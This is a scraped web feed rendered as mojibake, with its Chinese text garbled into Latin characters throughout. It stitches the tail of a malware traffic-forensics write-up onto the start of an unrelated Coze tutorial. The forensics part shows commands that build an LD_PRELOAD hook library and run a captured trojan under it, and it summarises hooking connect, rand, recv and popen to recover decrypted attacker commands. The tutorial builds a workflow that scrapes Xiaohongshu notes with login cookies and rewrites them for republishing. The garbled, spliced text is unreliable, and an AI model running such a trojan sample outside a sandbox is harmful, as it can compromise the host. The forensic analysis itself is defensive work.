<p>ç„¶ålinuxç¯å¢ƒä¸‹æ‰§è¡Œç»ˆç«¯å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ç¼–è¯‘ä¸ºå…±äº«åº“gcc -fPIC -shared -o hook.so hook.c -ldl<span class="hljs-comment"># ä½¿ç”¨ Hook åº“è¿è¡Œæœ¨é©¬ç¨‹åºLD_PRELOAD=./hook.so ./shell</span></span>
</code></pre>
<p><code>LD_PRELOAD</code> ç¯å¢ƒå˜é‡å‘Šè¯‰åŠ¨æ€é“¾æ¥å™¨åœ¨åŠ è½½å…¶ä»–å…±äº«åº“ä¹‹å‰å…ˆåŠ è½½æŒ‡å®šçš„åº“ï¼Œè¿™æ ·æˆ‘ä»¬ Hook çš„å‡½æ•°å°±ä¼šä¼˜å…ˆäºç³»ç»Ÿçš„åŒåå‡½æ•°è¢«è°ƒç”¨</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01d9e6838da24a32bfa54628b452220b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=hLIJf25YYk5%2FjcBfF1bMDIvWI1s%3D" alt="" loading="lazy"/></p>
<p>å­¦ä¹ äº†å­¦ä¹ äº†ï¼Œhookçš„å¥½å¤„å°±æ˜¯ä¸éœ€è¦ç†è§£ç¨‹åºå†…éƒ¨çš„åŠ å¯†ç®—æ³•å®ç°ï¼Œåªéœ€è¦çŸ¥é“åŠ å¯†å¯†é’¥å¹¶æ§åˆ¶ç¨‹åºçš„è¾“å…¥è¾“å‡ºæµç¨‹</p>
<h2 data-id="heading-7">7.æ€»ç»“</h2>
<p><strong>ç­›é€‰å®šä½</strong>ï¼šWiresharkè¿‡æ»¤ <code>http contains "keyword"</code>ï¼Œè¿½è¸ªTCPæµé‡ç»„å®Œæ•´ä¼šè¯ï¼Œå¼‚å¸¸ç‰¹å¾ï¼šæ•°æ®é‡è¿‡å¤§ã€å±é™©å‡½æ•°è°ƒç”¨ã€å¤šå±‚ç¼–ç </p>
<p><strong>ç¼–ç è§£ç </strong>ï¼šBase64ï¼ˆå­—ç¬¦é›†+4å€æ•°é•¿åº¦ï¼‰ã€Hexï¼ˆ0-9A-Fï¼‰ã€URLç¼–ç ï¼Œé€å±‚è§£ç åˆ°æ˜æ–‡</p>
<p><strong>åŠ å¯†åˆ†æ</strong>ï¼šæ‰¾åˆ°å¯†é’¥ç¡¬ç¼–ç ä½ç½®æˆ–åè®®åå•†é€»è¾‘ï¼Œå®ç°åŠ è§£å¯†ç®—æ³•ï¼Œæ³¨æ„è·¨å¹³å°rand()å®ç°å·®å¼‚</p>
<p><strong>æ¶æ„æå–</strong>ï¼šè¯†åˆ«PKå¤´ï¼ˆZIPï¼‰ã€æ˜æ–‡è„šæœ¬ï¼Œæå–è¿˜åŸæ”»å‡»ä»£ç </p>
<p><strong>é«˜çº§Hook</strong>ï¼šå½“åŠ å¯†å¤æ‚æ—¶ï¼Œç”¨LD_PRELOADåŠ«æŒ<code>connect</code>/<code>rand</code>/<code>recv</code>/<code>popen</code>ï¼Œæ³¨å…¥æµé‡æ•°æ®è·å–è§£å¯†å‘½ä»¤</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦å›¾æ–‡äºŒåˆ›ï¼Œå¯ç›´æ¥åˆ°å°ç»¿ä¹¦è‰ç¨¿ç®±ï¼Œäº¦å¯å‘å°çº¢ä¹¦]]></title>    <link>https://juejin.cn/post/7594351060614774803</link>    <guid>https://juejin.cn/post/7594351060614774803</guid>    <pubDate>2026-01-13T03:57:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594351060614774803" data-draft-id="7594389431835623465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦å›¾æ–‡äºŒåˆ›ï¼Œå¯ç›´æ¥åˆ°å°ç»¿ä¹¦è‰ç¨¿ç®±ï¼Œäº¦å¯å‘å°çº¢ä¹¦"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2026-01-13T03:57:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾é³´"/> <meta itemprop="url" content="https://juejin.cn/user/3683842894347076"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰£å­ï¼ˆCozeï¼‰å®æˆ˜ï¼šå°çº¢ä¹¦å›¾æ–‡äºŒåˆ›ï¼Œå¯ç›´æ¥åˆ°å°ç»¿ä¹¦è‰ç¨¿ç®±ï¼Œäº¦å¯å‘å°çº¢ä¹¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3683842894347076/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾é³´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:57:02.000Z" title="Tue Jan 13 2026 03:57:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¾é³´ã€‚ä¸“æ³¨äºåˆ†äº«æå‡å·¥ä½œä¸ç”Ÿæ´»æ•ˆç‡çš„å·¥å…·ï¼Œæ— å¿åˆ†äº«AIé¢†åŸŸç›¸å…³çš„ç²¾é€‰æŠ¥å‘Šï¼ŒæŒç»­å…³æ³¨AIçš„å‰æ²¿åŠ¨å‘ã€‚</p>
<p>æœ€è¿‘æœ‰äº›æœ‹å‹é—®ï¼Œæœ‰æ²¡æœ‰å°çº¢ä¹¦äºŒåˆ›çš„å·¥ä½œæµï¼Ÿç›®çš„æ˜¯çœ‹åˆ°å°çº¢ä¹¦ä¸Šé¢ä¸é”™çš„ä¸€äº›ç¬”è®°ï¼Œå¸Œæœ›å¯ä»¥å¯¹è¿™äº›ç¬”è®°è¿›è¡ŒäºŒåˆ›ï¼Œç„¶åå‘å¸ƒåˆ°å°ç»¿ä¹¦ä¸Šï¼Œæƒ³é€šè¿‡å·¥ä½œæµæŠŠæµç¨‹ç»™è‡ªåŠ¨åŒ–ã€‚</p>
<p>ä¹‹å‰å¾é³´æœ‰åˆ†äº«è¿‡ä¸€ç¯‡å…³äºå°çº¢ä¹¦äºŒåˆ›çš„ï¼Œæ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰å¯¹æ¥å°ç»¿ä¹¦ï¼Œè€Œä¸”é…å›¾æ²¡æœ‰è¿›è¡ŒäºŒåˆ›ï¼Œæœ¬æ–‡åˆ†äº«çš„å·¥ä½œæµé™¤äº†å®ç°å°çº¢ä¹¦çš„ç¬”è®°æ–‡æ¡ˆäºŒåˆ›å¤–ï¼Œè¿˜å°†è¿›è¡Œé…å›¾çš„äºŒæ¬¡åˆ›ä½œï¼Œå¹¶ä¸”æ”¯æŒç›´æ¥å‘é€å°ç»¿ä¹¦ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å‘å°çº¢ä¹¦ã€‚</p>
<p>åœ¨å¼€å§‹æœ¬å·¥ä½œæµçš„è®²è§£ä¹‹å‰æˆ‘ä»¬æ¥çœ‹çœ‹æ•ˆæœï¼Œæˆ‘åœ¨å°çº¢ä¹¦ä¸Šé€‰æ‹©äº†ä¸€ç¯‡ç¬”è®°ï¼ŒæŠŠç¬”è®°çš„é“¾æ¥ä¸¢ç»™å·¥ä½œæµï¼Œé€‰æ‹©è¾“å…¥äºŒåˆ›6å¼ é…å›¾ï¼Œå¤§çº¦èŠ±ä¸ª2ã€3åˆ†é’Ÿï¼Œä¸€ç¯‡å°çº¢ä¹¦å›¾æ–‡äºŒåˆ›çš„ç¬”è®°å°±ç”Ÿæˆå¥½äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed87ee4d202e433cae62aecfa70ef0aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=E1td0cxdZ2vLxMJC5jB9m3TbnQw%3D" alt="" loading="lazy"/></p>
<p>è¦å‘å°çº¢ä¹¦çš„è¯ï¼Œéœ€è¦ä»å·¥ä½œæµä¸ŠæŠŠäºŒåˆ›åçš„ç¬”è®°æ ‡é¢˜ã€é…å›¾ã€æ–‡æ¡ˆä¸‹è½½ä¸‹æ¥ï¼Œç„¶ååˆ°å°çº¢ä¹¦å¹³å°å‘å¸ƒã€‚</p>
<h2 data-id="heading-0">1. å®Œæ•´çš„å·¥ä½œæµç¨‹</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87c8773d9dba4bb58f472863f5045e5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=Lwoxiz48QchMLMpFpapxWLxsIjE%3D" alt="" loading="lazy"/></p>
<p>1ã€å°çº¢ä¹¦ç¬”è®°å†…å®¹æå–ï¼šé€šè¿‡æ’ä»¶ï¼Œæ ¹æ®è¾“å…¥çš„å°çº¢ä¹¦ç¬”è®°é“¾æ¥è·å–å°çº¢ä¹¦ç¬”è®°çš„æ ‡é¢˜ã€å†…å®¹ã€é…å›¾ç­‰ä¿¡æ¯ã€‚</p>
<p>2ã€å°çº¢ä¹¦å†…å®¹ä»¿å†™ï¼šä»æå–åˆ°çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹ä¸­ï¼Œæç‚¼ç¬”è®°çš„æ ¸å¿ƒè§‚ç‚¹ï¼Œå¹¶ä¸”å¯¹ä¾æ®æ ¸å¿ƒè§‚ç‚¹è¿›è¡Œä»¿å†™ã€‚</p>
<p>3ã€å°çº¢ä¹¦é…å›¾äºŒåˆ›ï¼šä»æå–åˆ°çš„å°çº¢ä¹¦ç¬”è®°å›¾ç‰‡åˆ—è¡¨ä¸­ï¼Œåˆ†æé…å›¾çš„é£æ ¼æ ¸å¿ƒå…ƒç´ ç­‰ä¿¡æ¯ï¼Œç„¶åè¿›è¡Œå›¾ç‰‡äºŒåˆ›ã€‚</p>
<p>4ã€å°ç»¿ä¹¦è‰ç¨¿ç”Ÿæˆï¼šæŠŠäºŒåˆ›åçš„å›¾ç‰‡ã€æ ‡é¢˜ã€ç¬”è®°å†…å®¹ä¸€èµ·å‘é€ç»™å°ç»¿ä¹¦ï¼Œç”Ÿæˆå°ç»¿ä¹¦æ–‡ç« è‰ç¨¿ã€‚</p>
<h2 data-id="heading-1">2. å·¥ä½œæµè¯¦ç»†èŠ‚ç‚¹è§£è¯»</h2>
<h3 data-id="heading-2">2.1. å¼€å§‹</h3>
<ul>
<li>note_urlï¼šå°çº¢ä¹¦ç¬”è®°é“¾æ¥ï¼Œå¿…å¡«</li>
<li>cookiesï¼šå°çº¢ä¹¦cookiesï¼Œå¿…å¡«</li>
<li>app_idï¼šå…¬ä¼—å·å¼€å‘è€…IDï¼Œå¿…å¡«</li>
<li>app_secretï¼šå…¬ä¼—å·å¼€å‘è€…å¯†é’¥ï¼Œå¿…å¡«</li>
<li>api_tokenï¼šæ’ä»¶è®¤è¯ï¼Œå¯åå°å›å¤ã€èŠéº»å¼€é—¨ã€‘è”ç³»è·å–ï¼ˆæœ‰æ¡ä»¶ï¼‰ï¼Œå¿…å¡«</li>
<li>numsï¼šé…å›¾æ•°é‡ï¼Œéå¿…å¡«ï¼Œé»˜è®¤6å¼ </li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/734c776deb234ab9a50d814a778633bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=qJZx96H43UUb6CPu6LeHGL1q26I%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2. è·å–å°çº¢ä¹¦ç¬”è®°å†…å®¹</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è·å–å°çº¢ä¹¦çš„ç¬”è®°å†…å®¹ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€å°çº¢ä¹¦å·¥å…·ç®±ã€‘çš„ã€get_xhs_note_detail_cookiesã€‘å·¥å…·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c645439a6c4d4ca4a4ac8f619974d468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=5OT92e93%2BwH3NtVubxXKWVxA2ck%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">2.3. å°çº¢ä¹¦ç¬”è®°æ ¸å¿ƒè§‚ç‚¹æç‚¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„å¤§æ¨¡å‹èŠ‚ç‚¹ï¼Œç”¨äºæå–å°çº¢ä¹¦ç¬”è®°çš„æ ¸å¿ƒè§‚ç‚¹ã€‚å› æœ¬å·¥ä½œæµæç¤ºè¯è¾ƒå¤šï¼Œæ–‡ç« ç¯‡å¹…åŸå› ï¼Œç³»ç»Ÿæç¤ºè¯æˆ‘ç»Ÿä¸€æ”¾åˆ°äº†æ–‡æœ«ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5fc13cb508941668d71440a3d59e5a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=q6YRecLFnN9D4aXFkcNwuCopCuc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2.4. å°ç»¿ä¹¦æ–‡ç« ä»¿å†™</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„å¤§æ¨¡å‹èŠ‚ç‚¹ï¼Œç”¨äºå¯¹å°çº¢ä¹¦çš„ç¬”è®°å†…å®¹è¿›è¡ŒäºŒåˆ›ï¼Œå®ƒçš„å‚æ•°å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ¨¡å‹ï¼šé€‰æ‹©ã€DeepSeek-V3.1ã€‘</li>
<li>è¾“å…¥ï¼š</li>
</ul>

<ul>
<li>
<ul>
<li>styleï¼šå°çº¢ä¹¦ç¬”è®°æ ¸å¿ƒè§‚ç‚¹æç‚¼ -&gt; note_style</li>
<li>abstractï¼šå°çº¢ä¹¦ç¬”è®°æ ¸å¿ƒè§‚ç‚¹æç‚¼ -&gt; note_abstract</li>
<li>core_pointï¼šå°çº¢ä¹¦ç¬”è®°æ ¸å¿ƒè§‚ç‚¹æç‚¼ -&gt; note_core_point</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c8d828deeb74b5bba77cdde49b7c2da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=kBrjyIVUpspDdE5LuZf8qqjvch0%3D" alt="" loading="lazy"/></p>
<p>PSï¼šæœ¬å·¥ä½œæµæç¤ºè¯è¾ƒå¤šï¼Œæ–‡ç« ç¯‡å¹…åŸå› ï¼Œç³»ç»Ÿæç¤ºè¯æˆ‘ç»Ÿä¸€æ”¾äºæ–‡æœ«ã€‚</p>
<h3 data-id="heading-6">2.5. å°ç»¿ä¹¦æ–‡ç« æ ‡é¢˜ç”Ÿæˆ</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æ ¹æ®äºŒåˆ›åçš„ç¬”è®°å†…å®¹æ¥ç”Ÿæˆçˆ†æ¬¾çš„æ–‡ç« æ ‡é¢˜ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„å¤§æ¨¡å‹èŠ‚ç‚¹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3c291f3e9744a4aa23d0c63da2e076b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=dYP0PC5FgK4a%2Bqt5hbPGiLK37Zw%3D" alt="" loading="lazy"/></p>
<p>PSï¼šæœ¬å·¥ä½œæµæç¤ºè¯è¾ƒå¤šï¼Œæ–‡ç« ç¯‡å¹…åŸå› ï¼Œç³»ç»Ÿæç¤ºè¯æˆ‘ç»Ÿä¸€æ”¾äºæ–‡æœ«ã€‚</p>
<h3 data-id="heading-7">2.6. é…å›¾é£æ ¼å…ƒç´ æå–</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥å¯¹å°çº¢ä¹¦ç¬”è®°é…å›¾çš„é£æ ¼ã€ä¸»ä½“å…ƒç´ è¿›è¡Œåˆ†æï¼Œä¾¿äºè¿›è¡Œå›¾ç‰‡äºŒåˆ›ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„æ‰¹å¤„ç†èŠ‚ç‚¹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8923788703d241e3bcec89eaa6b6a77c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=rw611uAquZTA6ES3xt66185eOv4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">2.7. é…å›¾å›¾ç‰‡æç¤ºè¯ç”Ÿæˆ</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è¯»å–å°çº¢ä¹¦ç¬”è®°é…å›¾å›¾ç‰‡ï¼Œå¹¶ä¸”é€šè¿‡è§†è§‰ç†è§£æ¨¡å‹åˆ†æé…å›¾çš„é£æ ¼å’Œæ ¸å¿ƒä¸»ä½“å…ƒç´ ï¼Œä¾¿äºè¿›è¡Œé…å›¾äºŒåˆ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a34976bc750446d1bb8829d46f1d39a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=KZKO%2BabDBNH6ZgLJXTtOx7s1Ndk%3D" alt="" loading="lazy"/></p>
<p>PSï¼šæœ¬å·¥ä½œæµæç¤ºè¯è¾ƒå¤šï¼Œæ–‡ç« ç¯‡å¹…åŸå› ï¼Œç³»ç»Ÿæç¤ºè¯æˆ‘ç»Ÿä¸€æ”¾äºæ–‡æœ«ã€‚</p>
<h3 data-id="heading-9">2.8. é…å›¾é£æ ¼å…ƒç´ æ±‡æ€»</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹æ˜¯æŠŠå‰é¢èŠ‚ç‚¹åˆ†æå¾—åˆ°çš„å°çº¢ä¹¦é…å›¾çš„é£æ ¼å’Œä¸»ä½“å…ƒç´ åšæ±‡æ€»ï¼Œä¾¿äºå¯¹é…å›¾è¿›è¡ŒäºŒåˆ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ada6c1557e8641de8cda0f6e04c3efc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=Gsd7lKdde0F9Bd9d08zIXMN%2Fev8%3D" alt="" loading="lazy"/></p>
<p>PSï¼šæœ¬å·¥ä½œæµæç¤ºè¯è¾ƒå¤šï¼Œæ–‡ç« ç¯‡å¹…åŸå› ï¼Œç³»ç»Ÿæç¤ºè¯æˆ‘ç»Ÿä¸€æ”¾äºæ–‡æœ«ã€‚</p>
<h3 data-id="heading-10">2.9. é…å›¾äºŒåˆ›</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„å›¾åƒç”ŸæˆèŠ‚ç‚¹ï¼Œç”¨æ¥å¯¹å°çº¢ä¹¦é…å›¾è¿›è¡ŒäºŒåˆ›ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c4652e12f414d7f83af6365f01432f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=kDhVUJ1klWYigghw1%2FATW5ooPfc%3D" alt="" loading="lazy"/></p>
<p>PSï¼šæœ¬å·¥ä½œæµæç¤ºè¯è¾ƒå¤šï¼Œæ–‡ç« ç¯‡å¹…åŸå› ï¼Œæç¤ºè¯æˆ‘ç»Ÿä¸€æ”¾äºæ–‡æœ«ã€‚</p>
<h3 data-id="heading-11">2.10. è·å–å¾®ä¿¡å…¬ä¼—å·æ¥å£å‡­è¯</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨åˆ°äº†æ‰£å­çš„ä¸‰æ–¹æ’ä»¶ã€å¾®ä¿¡å…¬ä¼—å·æ¥å£ã€‘çš„ã€get_access_tokenã€‘å·¥å…·ï¼Œç”¨äºè·å–æ¥å£è°ƒç”¨å‡­è¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce16aa8108f147d4bd47f458061c7ce6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=KmJvAbTKr930sCyChWkDr%2Bt1qRA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">2.11. é…å›¾æ‰¹é‡ä¸Šä¼ å°ç»¿ä¹¦</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„æ‰¹å¤„ç†èŠ‚ç‚¹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54761444896446a79dd773f2af400402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=pzgGdzGGfW36IdijJ2zPqZpvM8s%3D" alt="" loading="lazy"/></p>
